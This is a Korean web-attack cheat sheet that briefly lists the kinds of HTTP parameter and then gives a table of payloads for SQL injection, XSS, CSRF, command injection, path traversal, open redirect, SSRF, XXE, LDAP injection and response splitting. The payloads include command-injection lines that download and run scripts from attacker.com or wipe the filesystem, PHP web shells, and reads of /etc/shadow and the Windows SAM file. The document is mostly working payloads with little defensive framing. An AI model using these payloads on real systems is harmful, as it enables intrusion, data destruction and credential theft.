## ⛄HTTP 매개변수의 종류와 위치

* **쿼리 파라미터 (Query string)**: `?a=1&b=2` — URL 뒤 `?` 이후, `&`로 구분.
* **경로 파라미터 (Path params)**: `/users/{id}` 처럼 URL 경로 일부로 전달.
* **헤더 (Headers)**: `Authorization: Bearer ...`, `X-Forwarded-For: ...` 등.
* **본문 (Body)**:

  * `application/x-www-form-urlencoded` (`a=1&b=2`)
  * `multipart/form-data` (파일 업로드 + 폼)
  * `application/json` (`{"a":1}`)
* **쿠키 (Cookies)**: `Cookie: session=...`


## 🐨HTTP parameter(HTTP 매개변수)를 악용하는 여러 웹 공격에 대한 **페이로드**

| **공격 유형**                              | **페이로드**                                                                                                                                                      |                  |
| -------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------- |
| **SQL Injection (SQLi)**               | `' OR 1=1 --`                                                                                                                                                 |                  |
|                                        | `' UNION SELECT null, username, password FROM users --`                                                                                                       |                  |
|                                        | `' OR 'a'='a' --`                                                                                                                                             |                  |
|                                        | `'; DROP TABLE users --`                                                                                                                                      |                  |
| **XSS (Cross-Site Scripting)**         | `<script>alert('XSS Attack');</script>`                                                                                                                       |                  |
|                                        | `<img src="javascript:alert('XSS')">`                                                                                                                         |                  |
|                                        | `<a href="javascript:alert(document.cookie)">Click me</a>`                                                                                                    |                  |
|                                        | `<iframe src="javascript:alert('XSS')"></iframe>`                                                                                                             |                  |
| **CSRF (Cross-Site Request Forgery)**  | `<img src="https://example.com/change-password?new_password=attacker_password" />`                                                                            |                  |
|                                        | `<form action="https://example.com/change-email" method="POST"><input type="text" name="email" value="attacker@example.com" /><input type="submit" /></form>` |                  |
| **Command Injection**                  | `ls; rm -rf /`                                                                                                                                                |                  |
|                                        | `; echo "Hacked" > /tmp/hacked.txt`                                                                                                                           |                  |
|                                        | \`; curl [http://attacker.com/malware.sh](http://attacker.com/malware.sh)                                                                                     | bash\`           |
|                                        | `; wget http://attacker.com/malicious_script.sh -O /tmp/script.sh; chmod +x /tmp/script.sh; /tmp/script.sh`                                                   |                  |
| **Directory Traversal**                | `../../../../etc/passwd`                                                                                                                                      |                  |
|                                        | `../../../../etc/shadow`                                                                                                                                      |                  |
|                                        | `../../../../var/www/html/secret.txt`                                                                                                                         |                  |
|                                        | `..\\..\\..\\..\\windows\\system32\\config\\sam`                                                                                                              |                  |
| **Open Redirect**                      | `https://attacker.com`                                                                                                                                        |                  |
|                                        | `https://example.com/redirect?url=http://malicious.com`                                                                                                       |                  |
|                                        | `https://example.com/redirect?url=https://attacker.com`                                                                                                       |                  |
| **File Upload (RCE)**                  | `<?php system($_GET['cmd']); ?>`                                                                                                                              |                  |
|                                        | `<?php eval($_POST['data']); ?>`                                                                                                                              |                  |
|                                        | `data:image/svg+xml;base64,...`                                                                                                                               |                  |
| **HTTP Response Splitting**            | `http://victim.com/page?name=%0D%0ASet-Cookie:%20evil=1`                                                                                                      |                  |
|                                        | `http://victim.com/page?name=%0D%0AHTTP/1.1%20200%20OK%0D%0A`                                                                                                 |                  |
| **XML Injection**                      | `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`                                            |                  |
| **LDAP Injection**                     | \`\*)(                                                                                                                                                        | (password=\*))\` |
|                                        | `*' OR '1'='1`                                                                                                                                                |                  |
| **SSRF (Server-Side Request Forgery)** | `http://localhost:8080/admin`                                                                                                                                 |                  |
|                                        | `http://127.0.0.1:8888`                                                                                                                                       |                  |
|                                        | `http://attacker.com/fakeurl`                                                                                                                                 |                  |

---
